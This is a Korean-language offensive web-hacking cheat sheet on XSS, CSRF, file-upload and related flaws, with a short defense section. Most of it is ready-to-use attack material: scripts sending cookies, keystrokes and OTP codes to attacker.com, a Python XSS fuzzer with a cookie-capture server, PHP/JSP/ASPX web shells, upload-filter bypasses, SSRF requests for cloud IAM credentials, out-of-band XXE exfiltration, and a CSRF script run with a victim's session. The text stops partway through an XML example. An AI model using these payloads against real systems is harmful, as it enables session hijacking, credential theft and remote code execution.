# XSS / CSRF / 파일 업로드 취약점

## 1. XSS (Cross-Site Scripting)

### XSS 유형

| 유형 | 저장 여부 | 설명 |
|------|-----------|------|
| Stored XSS | DB에 저장 | 게시판, 프로필 등에 영구 저장 → 가장 위험 |
| Reflected XSS | 미저장 | URL 파라미터에 삽입 → 피싱 링크 |
| DOM-based XSS | 클라이언트 | JavaScript로 DOM 조작 시 발생 |

---

### 1-1. Stored XSS (저장형)

```html
<!-- 게시판 글 작성 시 삽입 -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**실제 공격 시나리오:**
```javascript
// 쿠키 탈취 → 세션 하이재킹
<script>
  new Image().src = "http://attacker.com/steal?c=" + document.cookie;
</script>

// 키로거
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "http://attacker.com/key?k=" + e.key;
  });
</script>

// 자격증명 피싱
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">'
    + '<input name="user" placeholder="Username">'
    + '<input name="pass" type="password" placeholder="Password">'
    + '<input type="submit"></form>';
</script>

// BeEF Hook (브라우저 익스플로잇)
<script src="http://attacker.com:3000/hook.js"></script>
```

---

### 1-2. Reflected XSS (반사형)

```
취약한 URL:
http://target.com/search?q=<script>alert(1)</script>

피싱 링크:
http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**URL 인코딩된 페이로드:**
```
http://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

### 1-3. DOM-based XSS

```javascript
// 취약한 코드
var name = document.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// 공격 URL
http://target.com/page#<img src=x onerror=alert(1)>

// location.href 악용
document.write('<a href="' + location.href + '">link</a>');
// 공격: javascript:alert(1) 삽입
```

---

### 1-4. XSS 필터 우회

```html
<!-- 태그 필터 우회 -->
<ScRiPt>alert(1)</ScRiPt>                 (대소문자 혼합)
<scr<script>ipt>alert(1)</scr</script>ipt>   (이중 삽입)
<img src=1 onerror=alert(1)>              (이벤트 핸들러)
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>

<!-- 따옴표 없이 -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>             (백틱)

<!-- 공백 우회 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- HTML 엔티티 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">

<!-- 프로토콜 우회 -->
<a href="JaVaScRiPt:alert(1)">
<a href="java&#9;script:alert(1)">    (탭 문자)
<a href="java&#10;script:alert(1)">   (개행)

<!-- CSP 우회 (JSONP 엔드포인트 활용) -->
<script src="https://trusted.com/api?callback=alert(1)"></script>

<!-- SVG 내부 스크립트 -->
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>

<!-- 인코딩 우회 -->
\u003cscript\u003ealert(1)\u003c/script\u003e   (유니코드)
```

---

### 1-5. XSS 쿠키 탈취 서버 만들기

```python
#!/usr/bin/env python3
"""
XSS 페이로드 퍼저 + 쿠키 탈취 수신 서버
퍼저: requests로 각 파라미터에 페이로드를 삽입하여 반영 여부 확인
수신 서버: 탈취된 쿠키/데이터를 로깅

사용법:
  # 퍼저 모드
  python3 xss_fuzzer.py fuzz -u "http://target.com/search?q=test"
  # 수신 서버 모드
  python3 xss_fuzzer.py server --port 8080
"""
import argparse
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote

import requests


# ── XSS 페이로드 목록 (필터 우회 포함) ────────────────────────────────────────
XSS_PAYLOADS: list[str] = [
    # 기본 탐지용 마커 (반영 여부 확인)
    "<xss>",
    "\"'><xss>",
    "</script><xss>",

    # 실제 실행 페이로드
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",

    # 이벤트 핸들러 (스크립트 태그 필터 우회)
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",

    # 대소문자 우회
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",

    # JavaScript 프로토콜
    "<a href=\"javascript:alert(1)\">click</a>",
    "<iframe src=\"javascript:alert(1)\">",

    # 인코딩 우회
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",

    # DOM 싱크 테스트
    "javascript:alert(1)",
    "';alert(1);//",
    "\";alert(1);//",

    # CSP 우회 (nonce 없는 환경)
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
]

STEAL_TEMPLATE = (
    "<script>"
    "fetch('http://ATTACKER_HOST/steal?c='+encodeURIComponent(document.cookie))"
    "</script>"
)


# ── 퍼저 ──────────────────────────────────────────────────────────────────────
class XSSFuzzer:
    def __init__(
        self,
        url: str,
        post_data: Optional[str] = None,
        cookies: Optional[str] = None,
        attacker_host: str = "attacker.com",
        delay: float = 0.2,
    ) -> None:
        self.url = url
        self.post_data = post_data
        self.method = "POST" if post_data else "GET"
        self.attacker_host = attacker_host
        self.delay = delay

        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (XSS-Fuzzer/2.0)"
        if cookies:
            for item in cookies.split(";"):
                k, _, v = item.strip().partition("=")
                self.session.cookies.set(k.strip(), v.strip())

        parsed = urlparse(url)
        self.base_params = (
            {k: v[0] for k, v in parse_qs(parsed.query).items()}
            if self.method == "GET"
            else {pair.split("=")[0]: pair.split("=")[1]
                  for pair in post_data.split("&") if "=" in pair}
        )

    def _send(self, params: dict) -> Optional[requests.Response]:
        try:
            if self.method == "GET":
                return self.session.get(self.url, params=params, timeout=10)
            else:
                return self.session.post(self.url, data=params, timeout=10)
        except requests.RequestException:
            return None

    def _is_reflected(self, resp: Optional[requests.Response], marker: str) -> bool:
        if resp is None:
            return False
        return marker.lower() in resp.text.lower()

    def fuzz(self) -> list[dict]:
        findings = []
        for param in self.base_params:
            print(f"[*] 파라미터: {param}")
            for payload in XSS_PAYLOADS:
                params = {**self.base_params, param: payload}
                resp = self._send(params)
                # 반영 여부 확인 (마커 탐지)
                marker = "<xss>" if "<xss>" in payload else payload[:10]
                if self._is_reflected(resp, marker):
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "status": resp.status_code if resp else None,
                        "url": self.url,
                    })
                    print(f"  [!] 반영 발견! payload: {payload!r}")
                time.sleep(self.delay)
        return findings


# ── 수신 서버 ──────────────────────────────────────────────────────────────────
LOG_FILE = Path("xss_captured.log")

class XSSReceiverHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        captured = {}
        for key in ("c", "cookie", "k", "key", "data", "token"):
            if key in params:
                captured[key] = params[key][0]

        if captured:
            line = f"[{timestamp}] {client_ip}  {captured}\n"
            print(f"[+] 데이터 수신: {line}", end="")
            with LOG_FILE.open("a") as f:
                f.write(line)

        # CORS 허용 + 투명 1px 이미지 응답 (브라우저 오류 방지)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # 1x1 투명 GIF
        self.wfile.write(b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
                         b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
                         b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
                         b"\x44\x01\x00\x3b")

    def log_message(self, fmt: str, *args) -> None:
        pass  # 기본 로그 억제


def run_server(host: str = "0.0.0.0", port: int = 8080) -> None:
    server = HTTPServer((host, port), XSSReceiverHandler)
    print(f"[*] XSS 수신 서버 시작: http://{host}:{port}")
    print(f"[*] 캡처 로그: {LOG_FILE.resolve()}")
    print(f"[*] XSS 페이로드: {STEAL_TEMPLATE.replace('ATTACKER_HOST', f'YOUR_IP:{port}')}")
    server.serve_forever()


# ── CLI ────────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(description="XSS 퍼저 + 수신 서버")
    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="XSS 퍼징 실행")
    fuzz_p.add_argument("-u", "--url", required=True)
    fuzz_p.add_argument("--post", help="POST 데이터")
    fuzz_p.add_argument("--cookie", help="쿠키 문자열")
    fuzz_p.add_argument("--delay", type=float, default=0.2)

    srv_p = sub.add_parser("server", help="수신 서버 실행")
    srv_p.add_argument("--port", type=int, default=8080)

    args = parser.parse_args()

    if args.cmd == "fuzz":
        fuzzer = XSSFuzzer(args.url, args.post, args.cookie, delay=args.delay)
        results = fuzzer.fuzz()
        print(f"\n[+] 총 {len(results)}개 XSS 반영 지점 발견")
    else:
        run_server(port=args.port)


if __name__ == "__main__":
    main()
```

---

## 2. CSRF (Cross-Site Request Forgery)

### 원리
```
1. 피해자 → 은행 사이트 로그인 (세션 쿠키 발급)
2. 공격자 → 악성 페이지 제작 (자동 요청 코드 삽입)
3. 피해자 → 악성 페이지 방문
4. 브라우저 → 피해자 쿠키와 함께 은행에 요청 자동 전송
5. 은행 → 피해자가 요청한 것으로 간주하여 처리
```

### CSRF 페이로드

**GET 방식 CSRF:**
```html
<!-- 이미지 태그로 자동 요청 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">

<!-- iframe 사용 -->
<iframe src="http://bank.com/delete_account" style="display:none">
```

**POST 방식 CSRF:**
```html
<!-- 자동 제출 폼 -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**JSON CSRF (Content-Type 우회):**
```html
<!-- application/x-www-form-urlencoded로 JSON 흉내 -->
<form action="http://api.target.com/user/update" method="POST"
      enctype="text/plain">
  <input name='{"admin":true,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF 토큰 우회

```
1. CSRF 토큰 미검증 → 토큰 없이 요청
2. Same-site 요청으로 토큰 획득 (XSS 연계)
   - XSS로 토큰 값 읽어서 CSRF 요청에 포함
3. Referrer 헤더 우회
   - Referrer 없이 요청
   - Referrer 위조
4. 예측 가능한 토큰 → 브루트포스
```

---

## 3. 파일 업로드 취약점

### 공격 목표
서버에 웹쉘(악성 스크립트)을 업로드하여 원격 명령 실행(RCE)

### 3-1. 기본 웹쉘

**PHP 웹쉘:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_POST['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>

<!-- 더 강력한 웹쉘 -->
<?php
$cmd = ($_REQUEST['cmd'] ?? '');
echo '<pre>' . shell_exec($cmd) . '</pre>';
?>
```

**JSP 웹쉘 (Java 서버):**
```jsp
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

**ASPX 웹쉘 (.NET 서버):**
```csharp
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

### 3-2. 확장자 필터 우회

**PHP 대체 확장자:**
```
.php
.php3  .php4  .php5  .php7
.phtml  .pht  .shtml
.pHp  .PhP  (대소문자 우회)
.php.bak  (이중 확장자)
```

**서버 설정 악용:**
```
.php%00.jpg     (Null byte — PHP 5.3 이하)
.php .jpg       (공백 + 확장자)
.php%20.jpg     (URL 인코딩 공백)
shell.php;.jpg  (세미콜론 우회 — Apache 일부 버전)
```

**Content-Type 우회:**
```
업로드 시 Content-Type: image/jpeg 로 변조
Burp Suite Intercept → Content-Type 수정
```

**파일 시그니처 우회 (Magic Bytes):**
```
PHP 코드 앞에 이미지 헤더 추가:
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

GIF 헤더 + PHP:
GIF89a<?php system($_GET['cmd']); ?>

실제 이미지 파일에 PHP 코드 삽입 (ExifTool):
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

### 3-3. 업로드 경로 확인

```bash
# 업로드 후 접근 경로 추측
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/media/shell.php
http://target.com/images/shell.php

# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

### 3-4. LFI → 파일 업로드 연계 (Log Poisoning)

```
1. 웹 서버 로그에 PHP 코드 삽입
   User-Agent: <?php system($_GET['cmd']); ?>

2. LFI로 로그 파일 실행
   http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
```

---

### 3-5. DOM 기반 XSS 소스와 싱크 (Sources & Sinks)

```
소스 (Source) — 공격자 입력이 들어오는 지점:
  document.URL
  document.location.href
  document.location.search
  document.location.hash
  document.referrer
  window.name
  postMessage 이벤트 데이터

싱크 (Sink) — 실행으로 이어지는 위험 함수:
  innerHTML, outerHTML        → HTML 삽입 → XSS
  document.write()            → HTML 삽입 → XSS
  eval()                      → JS 실행
  setTimeout(문자열)          → JS 실행
  setInterval(문자열)         → JS 실행
  location.href = 사용자입력  → javascript: 프로토콜
  jQuery.html()               → innerHTML과 동일

DOM XSS 탐지 (Polyglot 페이로드):
  javascript:/*--></title></style></textarea></script></xmp>
  <svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

방어:
  - textContent / innerText 사용 (innerHTML 대신)
  - DOMPurify 라이브러리로 HTML 살균 (sanitize)
  - Trusted Types API (Chrome 75+) 적용
```

### 3-6. 파일 업로드 취약점 — 버그바운티 관점 추가 기법

```
Content-Type 우회 (Burp Suite Intercept 사용):
  1. .php 파일 선택
  2. 요청 가로채기 → Content-Type: image/jpeg 로 변조
  3. 서버가 Content-Type만 검증 시 우회

이중 확장자 공격:
  shell.php.jpg  → Apache mod_mime 취약 설정 시 PHP로 처리
  shell.jpg.php  → 마지막 확장자를 실행 확장자로 처리

IIS 취약점:
  shell.asp;.jpg → IIS 6 취약 버전에서 ASP로 처리

파일 시그니처 조작 (Magic Bytes):
  GIF89a<?php system($_GET['cmd']); ?>
  → 파일 헤더는 GIF, 뒤에 PHP 코드 삽입
  → 이미지 검증 라이브러리를 우회

업로드 후 실행 경로 탐색:
  ffuf -u http://target.com/uploads/FUZZ -w wordlist.txt
  gobuster dir -u http://target.com -w dirs.txt -x php
```

---

## 4. 기타 주요 웹 취약점

### 4-1. Directory Traversal (경로 탐색)

```
http://target.com/download?file=../../../etc/passwd
http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/download?file=....//....//etc/passwd   (필터 우회)
http://target.com/download?file=%2Fetc%2Fpasswd

# 주요 타겟 파일
/etc/passwd          (사용자 목록)
/etc/shadow          (해시된 비밀번호, root 필요)
/etc/hosts
/etc/ssh/sshd_config
/var/log/apache2/access.log
/var/www/html/config.php
/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
```

### 4-2. SSRF (Server-Side Request Forgery)

```
# 내부망 탐색
http://target.com/fetch?url=http://192.168.1.1/
http://target.com/fetch?url=http://127.0.0.1/admin

# 클라우드 메타데이터 탈취
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF 우회
http://0.0.0.0/               (127.0.0.1 대체)
http://[::1]/                 (IPv6 루프백)
http://localhost.evil.com/    (DNS 리바인딩)
http://①②⑦.⓪.⓪.①/         (유니코드 숫자)

# SSRF → 내부 서비스 공격
http://target.com/fetch?url=dict://127.0.0.1:6379/   (Redis)
http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
```

### 4-3. XXE (XML External Entity)

```xml
<!-- 기본 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF 연계 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<data>&xxe;</data>

<!-- 외부 DTD 파일 참조 (Out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>

<!-- evil.dtd 내용 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
```

---

## 5. Burp Suite 실전 활용

### 필수 기능

```
1. Proxy (Intercept)
   - HTTP/HTTPS 트래픽 가로채기/수정
   - 브라우저 → Burp → 서버

2. Repeater
   - 요청 반복 전송 및 수정
   - 수동 테스트 핵심 도구

3. Intruder (자동화 공격)
   - Sniper: 하나의 파라미터에 페이로드 목록
   - Battering Ram: 모든 파라미터에 동일 페이로드
   - Pitchfork: 여러 파라미터에 각각 다른 페이로드
   - Cluster Bomb: 모든 조합 시도 (브루트포스)

4. Scanner (Pro 버전)
   - 자동 취약점 스캔

5. Decoder
   - URL/Base64/HTML/Hex 인코딩/디코딩

6. Comparer
   - 두 응답 비교 (차이 강조)

7. Sequencer
   - 토큰 랜덤성 분석 (CSRF 토큰, 세션 ID)
```

### Burp로 XSS 찾기
```
1. Proxy로 모든 입력 파라미터 식별
2. Repeater에서 각 파라미터에 <xss> 삽입
3. 응답에서 <xss>가 그대로 반환되면 XSS 가능
4. 실제 페이로드 시도 (alert, 쿠키 탈취)
```

### Burp로 SQL Injection 찾기
```
1. Repeater에서 파라미터에 ' 삽입 → SQL 오류 확인
2. 파라미터에 ' AND '1'='1 vs ' AND '1'='2 응답 비교
3. SQLMap과 연동: --proxy=http://127.0.0.1:8080
```

---

## 6. XSS 방어

### 출력 인코딩 (가장 중요)
```python
# Python (Flask)
from markupsafe import escape
safe_output = escape(user_input)

# HTML 특수문자 인코딩
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### Content Security Policy (CSP)
```http
# 가장 엄격한 CSP
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'

# nonce 기반 (인라인 스크립트 허용)
Content-Security-Policy: script-src 'nonce-{random_value}'
<script nonce="{random_value}">/* 허용된 스크립트 */</script>
```

### HttpOnly, Secure 쿠키
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly  → JavaScript에서 document.cookie 접근 불가 (XSS 쿠키 탈취 방어)
Secure    → HTTPS에서만 쿠키 전송
SameSite=Strict → 외부 사이트에서 쿠키 미전송 (CSRF 방어)
```

### CSRF 토큰 탈취 PoC (XSS 연계)

```python
#!/usr/bin/env python3
"""
CSRF 토큰 탈취 PoC — requests를 이용한 CSRF 공격 시뮬레이터
(교육 목적: 취약한 서버에서 CSRF 토큰 미검증 또는 XSS 연계 시 동작 확인)

사용법: python3 csrf_poc.py -t http://target.com/account/change-password \
                            --victim-session "session=abc123" \
                            --new-password "hacked123"
"""
import argparse
import re
from typing import Optional

import requests


class CSRFTokenExtractor:
    """
    세션 쿠키를 이용해 대상 페이지에서 CSRF 토큰을 추출하는 클래스.
    실제 공격에서는 XSS 페이로드가 피해자 브라우저에서 이 역할을 수행함.
    """

    TOKEN_PATTERNS = [
        r'name=["\']csrf[_\-]?token["\'].*?value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'].*?name=["\']csrf[_\-]?token["\']',
        r'<meta\s+name=["\']csrf[_\-]?token["\'].*?content=["\']([^"\']+)["\']',
        r'"csrfToken"\s*:\s*"([^"]+)"',
        r'window\.__csrf\s*=\s*["\']([^"\']+)["\']',
        r'data-csrf=["\']([^"\']+)["\']',
    ]

    def __init__(self, session: requests.Session) -> None:
        self.session = session

    def extract(self, url: str) -> Optional[str]:
        resp = self.session.get(url, timeout=10)
        for pattern in self.TOKEN_PATTERNS:
            match = re.search(pattern, resp.text, re.IGNORECASE | re.DOTALL)
            if match:
                token = match.group(1)
                print(f"[+] CSRF 토큰 탈취 성공: {token[:30]}...")
                return token
        print(f"[-] CSRF 토큰 미발견 (토큰 없이 요청 가능할 수 있음)")
        return None


def simulate_csrf_attack(
    target_url: str,
    victim_session: str,
    form_data: dict,
    referer_spoof: Optional[str] = None,
) -> None:
    """
    피해자 세션으로 CSRF 공격을 시뮬레이션.
    1. 세션으로 원본 페이지에서 CSRF 토큰 추출
    2. 추출한 토큰과 함께 악성 폼 제출
    """
    session = requests.Session()
    # 피해자 세션 쿠키 설정
    for item in victim_session.split(";"):
        k, _, v = item.strip().partition("=")
        session.cookies.set(k.strip(), v.strip())

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CSRF-PoC/1.0)",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    if referer_spoof:
        session.headers["Referer"] = referer_spoof

    # 원본 페이지에서 CSRF 토큰 추출 시도
    extractor = CSRFTokenExtractor(session)
    token = extractor.extract(target_url)

    # 폼 데이터에 토큰 포함 (있을 경우)
    if token:
        for possible_key in ("csrf_token", "csrftoken", "_token", "authenticity_token"):
            form_data[possible_key] = token
            break

    print(f"\n[*] CSRF 공격 요청 전송: {target_url}")
    print(f"    폼 데이터: {form_data}")

    resp = session.post(target_url, data=form_data, timeout=10,
                        allow_redirects=True)

    print(f"[*] 응답 코드: {resp.status_code}")
    print(f"[*] 응답 크기: {len(resp.text)} bytes")

    # 성공 여부 추론 (비밀번호 변경 시나리오)
    success_hints = ["success", "변경", "updated", "saved", "완료"]
    fail_hints    = ["invalid", "csrf", "forbidden", "403", "error"]

    body_lower = resp.text.lower()
    if any(h in body_lower for h in success_hints):
        print("[!] 공격 성공으로 추정 (응답에 성공 키워드 포함)")
    elif any(h in body_lower for h in fail_hints):
        print("[-] CSRF 방어가 작동 중 (실패 키워드 감지)")
    else:
        print("[?] 결과 불명확 (수동 응답 확인 필요)")


def main() -> None:
    parser = argparse.ArgumentParser(description="CSRF 공격 시뮬레이터 (교육용)")
    parser.add_argument("-t", "--target", required=True,
                        help="대상 URL (예: http://target.com/change-password)")
    parser.add_argument("--victim-session", required=True,
                        help="피해자 세션 쿠키 (예: session=abc123)")
    parser.add_argument("--data", default="new_password=hacked123",
                        help="전송할 폼 데이터 (예: field1=val1&field2=val2)")
    parser.add_argument("--referer", help="위조 Referer 헤더")
    args = parser.parse_args()

    form_data = dict(
        pair.split("=", 1) for pair in args.data.split("&") if "=" in pair
    )
    simulate_csrf_attack(args.target, args.victim_session, form_data, args.referer)


if __name__ == "__main__":
    main()
```

### CSRF 방어 구현

```python
#!/usr/bin/env python3
"""
Flask CSRF 방어 구현 — Synchronizer Token Pattern + SameSite 쿠키
"""
import secrets
import hashlib
import hmac
import time
from flask import Flask, request, session, abort, render_template_string, jsonify
from functools import wraps
from typing import Optional

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # 강력한 랜덤 비밀키 필수

CSRF_TOKEN_LIFETIME = 3600  # 1시간


def generate_csrf_token() -> str:
    """암호학적으로 안전한 CSRF 토큰 생성"""
    raw = secrets.token_urlsafe(32)
    timestamp = int(time.time())
    # HMAC으로 서명 → 위조 불가
    sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{timestamp}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return f"{raw}:{timestamp}:{sig}"


def validate_csrf_token(token: Optional[str]) -> bool:
    """CSRF 토큰 검증 (서명 + 만료 시간)"""
    if not token:
        return False
    try:
        raw, ts_str, sig = token.split(":", 2)
    except ValueError:
        return False

    timestamp = int(ts_str)
    if time.time() - timestamp > CSRF_TOKEN_LIFETIME:
        return False  # 만료

    expected_sig = hmac.new(
        app.secret_key.encode(),
        f"{raw}:{ts_str}".encode(),
        hashlib.sha256,
    ).hexdigest()
    return hmac.compare_digest(sig, expected_sig)  # 타이밍 공격 방지


def csrf_protect(f):
    """CSRF 보호 데코레이터 — POST/PUT/DELETE 요청 검증"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ("POST", "PUT", "PATCH", "DELETE"):
            token = (
                request.form.get("csrf_token")
                or request.headers.get("X-CSRF-Token")
                or request.json.get("csrf_token") if request.is_json else None
            )
            if not validate_csrf_token(token):
                abort(403, "CSRF 토큰이 유효하지 않습니다")
        return f(*args, **kwargs)
    return decorated


@app.route("/api/token", methods=["GET"])
def get_csrf_token():
    token = generate_csrf_token()
    session["csrf_token"] = token
    resp = jsonify({"csrf_token": token})
    # SameSite=Strict으로 추가 방어
    resp.set_cookie("csrf_token", token, httponly=False,
                    samesite="Strict", secure=True)
    return resp


@app.route("/api/change-password", methods=["POST"])
@csrf_protect
def change_password():
    new_pw = request.json.get("new_password", "")
    if len(new_pw) < 8:
        abort(400, "비밀번호는 8자 이상이어야 합니다")
    # 실제 로직...
    return jsonify({"status": "success"})
```

---

## 7. XSS를 이용한 MFA 우회

### 원리
```
MFA (2단계 인증)가 설정된 계정도 XSS로 우회 가능
→ XSS가 피해자 브라우저에서 실행되므로 세션이 이미 인증된 상태

공격 흐름:
1. 피해자가 MFA를 완료하고 로그인 성공
2. 저장형 XSS 페이로드가 피해자 브라우저에서 실행
3. 이미 인증된 세션(쿠키)을 공격자에게 전송
4. 공격자가 세션 쿠키로 직접 접근 (MFA 단계 건너뜀)
```

### MFA 우회 XSS 시나리오
```javascript
// 시나리오 1: 세션 쿠키 탈취 (HttpOnly 없을 때)
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// 시나리오 2: TOTP 코드 자동 캡처 (입력 폼이 있는 경우)
<script>
  document.getElementById('totp-input').addEventListener('input', function(e) {
    fetch('https://attacker.com/totp?code=' + e.target.value);
  });
</script>

// 시나리오 3: 가짜 MFA 팝업으로 피싱
<script>
  var overlay = document.createElement('div');
  overlay.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">
      <div style="background:white;margin:20% auto;padding:30px;width:300px;text-align:center">
        <h3>보안 인증</h3>
        <p>OTP 코드를 입력하세요</p>
        <input id="fake-otp" type="text">
        <button onclick="steal()">확인</button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  
  function steal() {
    var code = document.getElementById('fake-otp').value;
    fetch('https://attacker.com/mfa?code=' + code);
  }
</script>

// 시나리오 4: 비밀번호 변경 (CSRF + XSS 연계)
<script>
  // XSS로 CSRF 토큰 획득 후 비밀번호 변경
  fetch('/account/settings')
    .then(r => r.text())
    .then(html => {
      var token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
      return fetch('/account/change-password', {
        method: 'POST',
        body: 'csrf_token=' + token + '&new_password=hacked123',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
      });
    });
</script>
```

---

## 8. 컨텍스트별 XSS 인코딩 전략

### 삽입 위치에 따른 공격 방법
```html
<!-- 1. HTML 요소 컨텍스트 -->
<div>사용자입력</div>
공격: <script>alert(1)</script>
방어: HTML 엔티티 인코딩 (&lt; &gt; &amp;)

<!-- 2. HTML 속성 컨텍스트 -->
<input value="사용자입력">
공격: " onmouseover="alert(1)
방어: 속성값 따옴표 필수 + " → &quot; 인코딩

<!-- 3. JavaScript 컨텍스트 -->
<script>var x = '사용자입력'</script>
공격: '; alert(1); var y='
방어: JSON.stringify() + ' → \x27

<!-- 4. URL 컨텍스트 -->
<a href="사용자입력">
공격: javascript:alert(1)
방어: URL 스킴 화이트리스트 (http/https만 허용)

<!-- 5. CSS 컨텍스트 -->
<div style="color: 사용자입력">
공격: expression(alert(1))  (IE), url('javascript:...')
방어: CSS 파서 통한 값 검증

<!-- 6. JSON 응답에서 -->
{"message": "사용자입력"}
→ HTML 렌더링 시 DOM XSS 가능
방어: JSON response에도 HTML 인코딩
```

### 트로이 목마 로그인 패널 (Login Defacement)
```javascript
// 실제 로그인 폼을 공격자 서버로 제출하도록 변조
<script>
  // 정상 폼의 action 속성 변경
  var loginForm = document.querySelector('form[action*="login"]');
  if (loginForm) {
    loginForm.action = 'https://attacker.com/capture';
  }
  
  // 또는 전체 페이지 교체
  document.body.innerHTML = `
    <form method="POST" action="https://attacker.com/steal">
      <input name="username" placeholder="아이디">
      <input name="password" type="password" placeholder="비밀번호">
      <button>로그인</button>
    </form>`;
</script>
```

---

## 9. XXE 심화 (Billion Laughs + SAML 공격)

### Billion Laughs DoS 변형
```xml
<!-- 지수적 확장 공격 -->
<?xml version="1.0"?>
<!DOCTYPE billion [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- 수백 바이트 -->
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">   <!-- 10배 -->
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">   <!-- 100배 -->
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">   <!-- 1000배 -->
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">   <!-- 10000배 -->
]>
